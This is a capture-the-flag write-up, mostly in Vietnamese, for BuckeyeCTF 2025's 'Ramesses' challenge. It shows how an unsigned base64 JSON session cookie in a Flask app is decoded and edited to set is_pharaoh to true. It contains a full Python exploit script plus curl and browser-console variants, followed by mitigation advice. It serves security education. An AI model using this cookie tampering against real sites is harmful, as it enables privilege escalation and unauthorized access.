# Ramesses

## Challenge Description

```
Một ứng dụng Flask với session cookie được encode bằng base64.
Chỉ khi user có thuộc tính "is_pharaoh": true thì mới hiển thị flag.
Session cookie không được mã hóa hoặc ký, chỉ đơn thuần là base64 encoding.
```

**Files provided:**

- Source code Flask application (main.py)
- Templates (index.html, tomb.html)
- Dockerfile

**Challenge URL:** `https://ramesses.challs.pwnoh.io/`

---

## Difficulty Assessment

### Overall Difficulty: Easy

**Breakdown:**

- **Technical Complexity:** ⭐☆☆☆☆
- **Research Required:** ⭐☆☆☆☆
- **Time Consumption:** ⭐☆☆☆☆
- **Guessing Factor:** ⭐☆☆☆☆

**Why this difficulty?**
Bài này rất đơn giản, chỉ cần decode base64 cookie, sửa giá trị `is_pharaoh` thành `true`, encode lại và thay vào cookie. Không có encryption hay signature verification.

---

## Topics & Techniques

### Primary Topic

- **Insecure Session Management** - Cookie manipulation thông qua base64 encoding

### Sub-topics & Skills Required

- [x] **Base64 Encoding/Decoding** - Hiểu và manipulate base64 data
- [x] **Cookie Manipulation** - Sửa đổi browser cookies
- [x] **JSON** - Hiểu cấu trúc JSON data
- [x] **Flask Sessions** - Hiểu cách Flask xử lý session cookies (insecure implementation)

---

## Tools Used

### Essential Tools

```bash
# Browser DevTools - Edit cookies
F12 > Application/Storage > Cookies

# CyberChef - Base64 decode/encode
https://gchq.github.io/CyberChef/
```

### Tools List

| Tool             | Purpose                     | Installation |
| ---------------- | --------------------------- | ------------ |
| Browser DevTools | Inspect & edit cookies      | Built-in     |
| CyberChef        | Base64 encode/decode        | Online tool  |
| curl             | Testing with custom cookies | Built-in     |
| Python           | Script automation           | Built-in     |

---

## Useful Resources

### Documentation & References

- [Flask Sessions](https://flask.palletsprojects.com/en/stable/quickstart/#sessions) - Flask session management
- [Base64 Encoding](https://developer.mozilla.org/en-US/docs/Glossary/Base64) - Base64 explanation
- [HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) - Cookie mechanics

### Learning Materials

- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) - Secure session practices
- [CyberChef](https://gchq.github.io/CyberChef/) - Online encoding/decoding tool

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Decode session cookie từ base64, sửa `"is_pharaoh": false` thành `"is_pharaoh": true`, encode lại base64, thay vào cookie và reload trang để lấy flag.

---

### Step 1: Source Code Analysis

**Objective:** Phân tích code để hiểu session mechanism

Phân tích Flask application:

```python
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        name = request.form.get("name", "")
        cookie_data = {"name": name, "is_pharaoh": False}  # ⚠️ Always False
        encoded = base64.b64encode(json.dumps(cookie_data).encode()).decode()

        response = make_response(redirect(url_for("tomb")))
        response.set_cookie("session", encoded)  # ⚠️ No signing/encryption
        return response

@app.route("/tomb")
def tomb():
    session_cookie = request.cookies.get("session")
    try:
        user = json.loads(base64.b64decode(session_cookie).decode())  # ⚠️ Direct decode
    except Exception:
        return redirect(url_for("home"))
    return render_template("tomb.html", user=user, flag=flag)
```

**Observations:**

- Session cookie chỉ là `base64(json.dumps(data))` - không có signing/encryption
- `is_pharaoh` luôn được set là `False` khi tạo cookie
- Server trust cookie data hoàn toàn - không verify integrity
- Template `tomb.html` chỉ hiển thị flag khi `user.is_pharaoh == True`

```html
{% if user.is_pharaoh %}
<p>All lands say unto him: The flag is {{ flag }}</p>
{% else %}
<p>Cursed art thou for a thousand generations...</p>
{% endif %}
```

---

### Step 2: Inspecting Current Session Cookie

**Objective:** Decode cookie để xem cấu trúc dữ liệu

**Steps:**

1. Access trang web: `https://ramesses.challs.pwnoh.io/`
2. Nhập name bất kỳ (ví dụ: "admin") và submit form
3. Mở DevTools (F12) → Application/Storage → Cookies
4. Copy giá trị cookie `session`

**Cookie value:**

```
eyJuYW1lIjogImFkbWluJyIsICJpc19waGFyYW9oIjogZmFsc2V9
```

**Decode using CyberChef:**

1. Mở [CyberChef](https://gchq.github.io/CyberChef/)
2. Recipe: `From Base64`
3. Input: `eyJuYW1lIjogImFkbWluJyIsICJpc19waGFyYW9oIjogZmFsc2V9`

**Decoded result:**

```json
{ "name": "admin'", "is_pharaoh": false }
```

**Key findings:**

- Cookie chứa JSON object với 2 fields: `name` và `is_pharaoh`
- `is_pharaoh` đang là `false` → cần thay đổi thành `true`
- Không có signature hoặc encryption → có thể modify tùy ý

---

### Step 3: Modifying the Cookie

**Objective:** Tạo cookie mới với `is_pharaoh: true`

**Modified JSON:**

```json
{ "name": "admin'", "is_pharaoh": true }
```

**Encode using CyberChef:**

1. Recipe: `To Base64`
2. Input: `{"name": "admin'", "is_pharaoh": true}`

**Encoded result:**

```
eyJuYW1lIjogImFkbWluJyIsICJpc19waGFyYW9oIjogdHJ1ZX0=
```

---

### Step 4: Replacing the Cookie & Getting Flag

**Objective:** Thay cookie mới và reload trang để lấy flag

**Steps:**

1. Mở DevTools (F12) → Application/Storage → Cookies
2. Double-click vào giá trị cookie `session`
3. Thay bằng giá trị mới: `eyJuYW1lIjogImFkbWluJyIsICJpc19waGFyYW9oIjogdHJ1ZX0=`
4. Reload trang `/tomb`

**Result:**

Trang hiển thị:

```
Pharaoh admin'

What a happy day! Heaven and earth rejoice, for thou art the great lord of Egypt.

All lands say unto him: The flag is bctf{...}
```

**Flag obtained:**

```
bctf{session_cookies_should_be_signed}
```

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for Ramesses Challenge - BuckeyeCTF 2025
"""

import requests
import base64
import json

TARGET_URL = "https://ramesses.challs.pwnoh.io"

def exploit():
    print("[*] Ramesses CTF - Insecure Session Cookie Exploit")
    print("[*] Target:", TARGET_URL)

    # Step 1: Get initial cookie
    print("\n[*] Step 1: Creating account and getting session cookie...")
    session = requests.Session()
    data = {"name": "admin"}
    response = session.post(f"{TARGET_URL}/", data=data)

    if 'session' not in session.cookies:
        print("[-] Failed to get session cookie")
        return

    original_cookie = session.cookies['session']
    print(f"[+] Original cookie: {original_cookie}")

    # Step 2: Decode cookie
    print("\n[*] Step 2: Decoding session cookie...")
    try:
        decoded = base64.b64decode(original_cookie).decode()
        print(f"[+] Decoded JSON: {decoded}")
        cookie_data = json.loads(decoded)
        print(f"[+] Parsed data: {cookie_data}")
    except Exception as e:
        print(f"[-] Decode failed: {e}")
        return

    # Step 3: Modify cookie
    print("\n[*] Step 3: Modifying is_pharaoh to true...")
    cookie_data['is_pharaoh'] = True
    modified_json = json.dumps(cookie_data)
    modified_cookie = base64.b64encode(modified_json.encode()).decode()
    print(f"[+] Modified JSON: {modified_json}")
    print(f"[+] Modified cookie: {modified_cookie}")

    # Step 4: Get flag with modified cookie
    print("\n[*] Step 4: Accessing /tomb with modified cookie...")
    session.cookies.set('session', modified_cookie)
    response = session.get(f"{TARGET_URL}/tomb")

    if response.status_code == 200:
        print("[+] Request successful!")

        # Extract flag
        import re
        flag_match = re.search(r'bctf\{[^}]+\}', response.text)

        if flag_match:
            flag = flag_match.group(0)
            print(f"\n[!] FLAG FOUND: {flag}\n")
        else:
            print("[-] Flag not found in response")
            if "Pharaoh" in response.text:
                print("[+] Successfully became Pharaoh!")
                print("[*] Response preview:")
                print(response.text[:500])
    else:
        print(f"[-] Request failed with status code: {response.status_code}")

if __name__ == "__main__":
    exploit()
```

</details>

---

## Alternative Solutions

### Method 2: Using curl

```bash
# Create modified cookie
PAYLOAD='{"name": "admin", "is_pharaoh": true}'
COOKIE=$(echo -n "$PAYLOAD" | base64)

# Access with modified cookie
curl -b "session=$COOKIE" https://ramesses.challs.pwnoh.io/tomb
```

### Method 3: Browser Console

```javascript
// In browser console on /tomb page
const payload = { name: "admin", is_pharaoh: true };
const cookie = btoa(JSON.stringify(payload));
document.cookie = `session=${cookie}`;
location.reload();
```

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **Session Security is Critical:** Session cookies phải được signed hoặc encrypted để prevent tampering. Base64 chỉ là encoding, không phải security measure.

2. **Never Trust Client Data:** Server không nên trust bất kỳ data nào từ client (cookies, headers, form data) mà không verify integrity.

3. **Base64 ≠ Security:** Base64 encoding không cung cấp bất kỳ bảo mật nào, chỉ là cách encode binary data thành text.

4. **Flask Secure Sessions:** Flask cung cấp signed sessions với `SECRET_KEY`, nhưng bài này implement custom insecure session.

### Mistakes Made

- ❌ Nghĩ rằng cookie được bảo vệ → ✅ Nhận ra chỉ là base64 encoding
- ❌ Tìm cách bypass server-side check → ✅ Không có check nào, chỉ cần modify cookie

### Tips & Tricks

- 💡 Luôn check cookies trong DevTools khi làm web challenges
- 💡 Thử decode cookies với base64, hex, URL encoding
- 💡 Nếu cookie là JSON, thử modify các giá trị boolean, permissions
- 💡 CyberChef là công cụ tuyệt vời cho encode/decode operations

### Real-world Application

**Insecure session management trong thực tế:**

- Account takeover
- Privilege escalation (user → admin)
- Bypass payment checks
- Access unauthorized resources

**Common vulnerable patterns:**

- Base64-only encoding
- JWT without signature verification
- Client-side role storage without integrity check
- Predictable session IDs

---

## Prevention & Mitigation

### How to prevent this vulnerability?

1. **Use Flask's built-in secure sessions:**

```python
# Bad code (vulnerable)
cookie_data = {"name": name, "is_pharaoh": False}
encoded = base64.b64encode(json.dumps(cookie_data).encode()).decode()
response.set_cookie("session", encoded)  # ❌ No signing

# Good code (secure)
from flask import session

app.secret_key = os.urandom(24)  # Strong random key

@app.route("/", methods=["POST"])
def home():
    session['name'] = request.form.get("name", "")
    session['is_pharaoh'] = False  # ✓ Signed by Flask
    return redirect(url_for("tomb"))

@app.route("/tomb")
def tomb():
    if 'name' not in session:
        return redirect(url_for("home"))

    user = {
        'name': session['name'],
        'is_pharaoh': session['is_pharaoh']
    }
    return render_template("tomb.html", user=user, flag=flag)
```

2. **Server-side session storage:**

```python
# Store sensitive data server-side, only session ID in cookie
from flask_session import Session

app.config['SESSION_TYPE'] = 'redis'  # or 'filesystem', 'sqlalchemy'
Session(app)

# Session data stored on server, not in cookie
session['is_pharaoh'] = False
```

3. **Never trust client-side data for authorization:**

```python
# Bad: Trust cookie data for authorization
if user['is_pharaoh']:  # ❌ user data from cookie
    show_flag()

# Good: Check server-side database
from database import get_user_role

if get_user_role(session['user_id']) == 'pharaoh':  # ✓ Check DB
    show_flag()
```

4. **Use HMAC for cookie integrity:**

```python
import hmac
import hashlib

SECRET_KEY = os.urandom(32)

def sign_cookie(data):
    signature = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
    return f"{data}.{signature}"

def verify_cookie(signed_data):
    try:
        data, signature = signed_data.rsplit('.', 1)
        expected_sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
        if hmac.compare_digest(signature, expected_sig):
            return data
    except:
        pass
    return None
```

### Secure coding practices

- ✅ Use framework's built-in secure session management
- ✅ Store sessions server-side when possible
- ✅ Always sign/encrypt sensitive cookies
- ✅ Never store authorization data client-side
- ✅ Use strong random SECRET_KEY
- ✅ Set secure cookie flags: HttpOnly, Secure, SameSite
- ✅ Implement proper session expiration and rotation

```python
# Secure cookie configuration
response.set_cookie(
    'session',
    value=signed_cookie,
    httponly=True,      # Prevent JavaScript access
    secure=True,        # HTTPS only
    samesite='Strict',  # CSRF protection
    max_age=3600        # 1 hour expiration
)
```

---

## References & Credits

### Official Resources

- Challenge author: BuckeyeCTF 2025 Team
- Challenge URL: https://ramesses.challs.pwnoh.io/

### Community Writeups

- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [Flask](https://flask.palletsprojects.com/) - Web framework
- [CyberChef](https://gchq.github.io/CyberChef/) - Encoding/decoding tool
- [Browser DevTools](https://developer.chrome.com/docs/devtools/) - Cookie inspection
